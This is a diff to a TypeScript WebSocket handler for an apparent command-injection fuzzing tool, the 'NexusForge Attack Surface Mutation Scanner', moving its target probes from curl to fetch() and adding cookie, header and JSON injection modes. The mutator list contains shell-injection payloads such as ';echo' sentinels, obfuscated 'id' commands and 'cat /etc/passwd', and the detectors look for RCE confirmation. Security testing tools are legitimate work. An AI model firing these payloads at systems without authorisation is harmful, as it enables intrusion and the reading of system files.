@@ -1,47 +1,12 @@
 import type { WebSocket } from "ws";
-import { execFile as execFileCb } from "child_process";
-import { promisify } from "util";
 import { randomBytes } from "crypto";
-import { tmpdir } from "os";
-import { join } from "path";
-import { readFile, unlink } from "fs/promises";
 import { MutationScannerRequestSchema } from "../lib/schemas.js";
-
-const execFileP = promisify(execFileCb);
 
 interface MutMsg { type: string; [k: string]: unknown; }
 
 function send(ws: WebSocket, msg: MutMsg): void {
   if (ws.readyState === 1) {
     try { ws.send(JSON.stringify(msg)); } catch { /* connection closed mid-send */ }
-  }
-}
-
-async function curlGet(
-  url: string,
-  headers: Record<string, string>,
-): Promise<{ status: number; body: string; elapsed: number }> {
-  const t0      = Date.now();
-  const tag     = randomBytes(4).toString("hex");
-  const outFile = join(tmpdir(), `nmut_body_${tag}`);
-  const hdrFile = join(tmpdir(), `nmut_hdr_${tag}`);
-  const args = [
-    "--silent", "--insecure",
-    "--max-time", "18", "--connect-timeout", "8",
-    "--output", outFile, "--dump-header", hdrFile,
-    "--write-out", "%{http_code}",
-    "--compressed", "--http1.1",
-    "-X", "GET",
-  ];
-  for (const [k, v] of Object.entries(headers)) args.push("-H", `${k}: ${v}`);
-  args.push(url);
-  try {
-    const { stdout } = await execFileP("curl", args, { timeout: 19_000, maxBuffer: 4 * 1024 * 1024 });
-    const status = parseInt(stdout.trim(), 10) || 0;
-    const body   = await readFile(outFile, "utf8").catch(() => "");
-    return { status, body, elapsed: Date.now() - t0 };
-  } finally {
-    await Promise.allSettled([unlink(outFile), unlink(hdrFile)]);
   }
 }
 
@@ -52,38 +17,51 @@ async function probe(
   method: string,
   headers: Record<string, string>,
 ): Promise<{ status: number; body: string; elapsed: number }> {
+  const t0 = Date.now();
   try {
     const u = new URL(baseUrl);
-    if (method === "GET") {
+    let response: Response;
+
+    if (method === "GET" || method === "DELETE") {
       u.searchParams.set(param, payload);
-      return await curlGet(u.toString(), headers);
+      response = await fetch(u.toString(), {
+        method,
+        headers,
+        signal: AbortSignal.timeout(18_000),
+      });
+    } else if (method === "JSON") {
+      response = await fetch(u.toString(), {
+        method: "POST",
+        headers: { ...headers, "Content-Type": "application/json" },
+        body: JSON.stringify({ [param]: payload }),
+        signal: AbortSignal.timeout(18_000),
+      });
+    } else if (method === "COOKIE") {
+      response = await fetch(u.toString(), {
+        method: "GET",
+        headers: { ...headers, "Cookie": `${param}=${encodeURIComponent(payload)}` },
+        signal: AbortSignal.timeout(18_000),
+      });
+    } else if (method === "HEADER") {
+      response = await fetch(u.toString(), {
+        method: "GET",
+        headers: { ...headers, [param]: payload },
+        signal: AbortSignal.timeout(18_000),
+      });
+    } else {
+      const body = new URLSearchParams({ [param]: payload }).toString();
+      response = await fetch(u.toString(), {
+        method,
+        headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
+        body,
+        signal: AbortSignal.timeout(18_000),
+      });
     }
-    const tag     = randomBytes(4).toString("hex");
-    const outFile = join(tmpdir(), `nmut_body_${tag}`);
-    const hdrFile = join(tmpdir(), `nmut_hdr_${tag}`);
-    const t0      = Date.now();
-    const args = [
-      "--silent", "--insecure",
-      "--max-time", "18", "--connect-timeout", "8",
-      "--output", outFile, "--dump-header", hdrFile,
-      "--write-out", "%{http_code}",
-      "--compressed", "--http1.1",
-      "-X", method,
-      "-H", `Content-Type: application/x-www-form-urlencoded`,
-      "--data-raw", `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`,
-    ];
-    for (const [k, v] of Object.entries(headers)) args.push("-H", `${k}: ${v}`);
-    args.push(u.toString());
-    try {
-      const { stdout } = await execFileP("curl", args, { timeout: 19_000, maxBuffer: 4 * 1024 * 1024 });
-      const status = parseInt(stdout.trim(), 10) || 0;
-      const body   = await readFile(outFile, "utf8").catch(() => "");
-      return { status, body, elapsed: Date.now() - t0 };
-    } finally {
-      await Promise.allSettled([unlink(outFile), unlink(hdrFile)]);
-    }
+
+    const body = await response.text();
+    return { status: response.status, body: body.slice(0, 131_072), elapsed: Date.now() - t0 };
   } catch {
-    return { status: 0, body: "", elapsed: 0 };
+    return { status: 0, body: "", elapsed: Date.now() - t0 };
   }
 }
 
@@ -144,7 +122,7 @@ const MUTATORS: ((p: string) => string)[] = [
   p => "<!--" + p + "-->",
   p => p.replace(/id/g, "$'\\151\\144'"),
   p => p.replace(/id/g, "$(\\x69\\x64)"),
-  p => p + ";echo nx_ok_$$",
+  p => p + ";echo nx_ok_" + randomBytes(2).toString("hex"),
   p => ";(" + p + ")",
   p => "{" + p + "}",
   p => p.replace(/id/g, "cat /etc/passwd"),
@@ -187,7 +165,7 @@ function detectOutput(body: string): string | null {
     [/Linux\s+\S+\s+\d+\.\d+/,          "uname output — kernel version leaked"],
     [/Darwin\s+\S+\s+\S+/,              "uname output — macOS kernel version leaked"],
     [/Microsoft Windows/i,               "Windows system info leaked"],
-    [/nx_ok_\d+/,                        "sentinel echo hit — blind RCE confirmed"],
+    [/nx_ok_[0-9a-f]+/,                  "sentinel echo hit — blind RCE confirmed"],
     [/vulnerable/i,                      "echo injection confirmed"],
     [/EXECUTION CONFIRMED/i,             "nested execution confirmed"],
   ];
@@ -236,7 +214,7 @@ export function handleMutationScanner(ws: WebSocket): void {
     (async () => {
       send(ws, { type: "banner", text:
         `╔══════════════════════════════════════════════════════════════╗\n` +
-        `║  NEXUSFORGE  ATTACK SURFACE MUTATION SCANNER v1             ║\n` +
+        `║  NEXUSFORGE  ATTACK SURFACE MUTATION SCANNER v2             ║\n` +
         `║  Genetic payload evolution + propagation mapping            ║\n` +
         `╚══════════════════════════════════════════════════════════════╝\n` +
         `  TARGET    : ${targetUrl}\n` +
